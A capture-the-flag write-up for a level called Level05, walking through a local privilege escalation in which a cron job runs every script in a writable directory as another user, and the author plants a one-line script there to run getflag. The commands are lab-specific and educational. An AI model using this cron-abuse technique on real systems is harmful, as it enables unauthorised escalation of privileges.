# Level05 Write-up

## Objective:

The goal of this level was to exploit a scheduled task to execute a custom script and retrieve the flag.

## Step-by-step process:

### Step 1: Finding the Relevant File

I began by searching the file system for any files related to `level05`:

```bash
find / -name "level05" 2> /dev/null
```

This search led me to the following file:

`/var/mail/level05`

### Step 2: Investigating the Mail File

Next, I examined the contents of the mail file to gather more information:

```bash
cat /var/mail/level05
```

The file revealed a cron job scheduled to run every 2 minutes:

`*/2 * * * * su -c "sh /usr/sbin/openarenaserver" - flag05`

This cron job executes the `/usr/sbin/openarenaserver` script as the `flag05` user.

### Step 3: Analyzing the `openarenaserver` Script

I then inspected the contents of the `/usr/sbin/openarenaserver` script:

```bash
cat /usr/sbin/openarenaserver
```

The script loops through all files in the `/opt/openarenaserver` directory and executes each one with a time limit of 5 seconds:

```bash
#!/bin/sh

for i in /opt/openarenaserver/* ; do
(ulimit -t 5; bash -x "$i")
rm -f "$i"
done
```

This script removes each file after execution, so I realized I could place a script in the `/opt/openarenaserver/` directory that would execute `getflag`.

### Step 4: Creating the Exploit Script

I created a script named `super.sh` in the `/opt/openarenaserver/` directory that would run the `getflag` command and store the result in `/tmp/result`:

```bash
echo "getflag > /tmp/result" > /opt/openarenaserver/super.sh
chmod 777 /opt/openarenaserver/super.sh
```

### Step 5: Waiting for the Cron Job to Execute

Since the cron job runs every 2 minutes, I waited for the script to execute. After the cron job ran, the `getflag` command was executed, and the flag was written to `/tmp/result`.

### Step 6: Retrieving the Flag

Finally, I retrieved the flag by reading the contents of the `/tmp/result` file:

```bash
cat /tmp/result
```
